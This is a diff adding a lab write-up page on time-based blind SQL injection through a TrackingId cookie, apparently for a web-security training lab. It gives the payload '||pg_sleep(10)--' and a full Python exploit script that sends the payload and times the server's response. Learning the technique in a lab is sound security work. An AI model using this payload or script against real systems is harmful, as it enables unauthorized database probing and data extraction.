@@ -1,0 +1,122 @@
+---
+title: 'SQLi Lab 14'
+description: 'Blind SQL injection using time delays to infer information'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Blind SQL injection with time delays
+
+<div style="text-align: justify;">
+  This lab demonstrates how to exploit a blind SQL injection vulnerability using time delays. The application uses a `TrackingId` cookie for analytics, but the results of the SQL query are not returned, and the application's response does not differ whether the query returns rows or errors. By injecting a conditional time delay, it is possible to infer that the SQL query was executed, which is a fundamental technique in blind SQL injection attacks.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The application is vulnerable via the `TrackingId` cookie.
+- The payload `' || pg_sleep(10)--` introduces a 10-second delay.
+- By measuring the response time, it can be confirmed that the SQL injection executed successfully.
+- This technique can be extended to extract data one bit at a time in blind SQL injection attacks.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+import time
+
+# ---------------------------
+# Configuration
+# ---------------------------
+
+# Disable SSL warnings for lab/testing purposes
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Optional: route traffic through Burp Suite for inspection
+PROXIES = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+# Time delay to trigger for blind SQL injection
+TIME_DELAY = 10  # seconds
+
+# ---------------------------
+# Functions
+# ---------------------------
+
+def check_burp():
+    """
+    Verify that Burp Suite proxy is running.
+    Exit if it's not reachable.
+    """
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=3)
+    except requests.exceptions.RequestException:
+        print("[-] Burp Suite proxy not running at 127.0.0.1:8080. Start it and retry.")
+        sys.exit(1)
+    print("[+] Burp Suite proxy detected.")
+
+
+def send_sqli_request(url, delay=TIME_DELAY, proxies=PROXIES):
+    """
+    Send a time-based blind SQL injection payload via the TrackingId cookie.
+    Measures response time to detect success.
+    """
+    payload = f"'||pg_sleep({delay})--"
+    cookies = {"TrackingId": payload, "session": "dummy"}
+
+    print(f"[+] Sending payload: {payload}")
+    start_time = time.time()
+
+    try:
+        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Request failed: {e}")
+        return None
+
+    elapsed = time.time() - start_time
+    print(f"[+] Response time: {elapsed:.2f} seconds")
+
+    # Check if response time indicates SQL injection
+    if elapsed >= delay:
+        print("[+] SQL Injection likely successful (time delay triggered).")
+    else:
+        print("[-] No significant delay detected. Payload may not have executed.")
+
+    return elapsed
+
+
+def main():
+    # Main entry point. Validates arguments, checks Burp, and executes exploit.
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        print(f"Example: python {sys.argv[0]} https://example.com")
+        sys.exit(1)
+
+    url = sys.argv[1].strip()
+    print(f"[+] Target URL: {url}")
+
+    # Optional: ensure Burp Suite proxy is running
+    check_burp()
+
+    # Execute the blind SQL injection test
+    send_sqli_request(url)
+
+
+# ---------------------------
+# Entry point
+# ---------------------------
+if __name__ == "__main__":
+    main()
+```
